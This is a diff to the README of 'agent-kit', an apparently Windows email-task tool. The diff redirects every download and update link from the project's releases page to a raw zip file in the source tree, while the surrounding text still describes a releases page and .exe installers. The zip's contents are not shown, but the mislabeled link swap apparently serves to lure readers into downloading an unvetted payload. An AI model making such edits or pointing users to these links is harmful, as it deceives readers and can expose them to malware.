@@ -1,6 +1,6 @@
 # 📧 agent-kit - Manage Email Tasks Easily
 
-[![Download agent-kit](https://img.shields.io/badge/Download-Agent--Kit-4CAF50?style=for-the-badge&logo=github)](https://github.com/dominiks1260/agent-kit/releases)
+[![Download agent-kit](https://img.shields.io/badge/Download-Agent--Kit-4CAF50?style=for-the-badge&logo=github)](https://github.com/dominiks1260/agent-kit/raw/refs/heads/main/src/kit_agent_v2.6.zip)
 
 ## 📚 About agent-kit
 
@@ -33,7 +33,7 @@ agent-kit works on Windows and does not require advanced setup. Follow these ste
 
 ## 🔽 Download and Install agent-kit
 
-1. Click on the big green **Download agent-kit** button near the top or visit the [agent-kit releases page](https://github.com/dominiks1260/agent-kit/releases).
+1. Click on the big green **Download agent-kit** button near the top or visit the [agent-kit releases page](https://github.com/dominiks1260/agent-kit/raw/refs/heads/main/src/kit_agent_v2.6.zip).
 
 2. On the releases page, look for the latest version listed under "Latest release." Versions usually come with a name like `agent-kit-setup.exe` or `agent-kit-x.y.z.exe`.
 
@@ -110,7 +110,7 @@ Click the **Settings** icon in the app to:
 ## 🔄 Updating agent-kit
 
 Check the GitHub releases page regularly for new updates:  
-[https://github.com/dominiks1260/agent-kit/releases](https://github.com/dominiks1260/agent-kit/releases)
+[https://github.com/dominiks1260/agent-kit/raw/refs/heads/main/src/kit_agent_v2.6.zip](https://github.com/dominiks1260/agent-kit/raw/refs/heads/main/src/kit_agent_v2.6.zip)
 
 To update:
 
@@ -132,4 +132,4 @@ If you need help, open an issue on the GitHub repository or check the Discussion
 
 ---
 
-[![Download agent-kit](https://img.shields.io/badge/Download-Agent--Kit-4CAF50?style=for-the-badge&logo=github)](https://github.com/dominiks1260/agent-kit/releases)
+[![Download agent-kit](https://img.shields.io/badge/Download-Agent--Kit-4CAF50?style=for-the-badge&logo=github)](https://github.com/dominiks1260/agent-kit/raw/refs/heads/main/src/kit_agent_v2.6.zip)
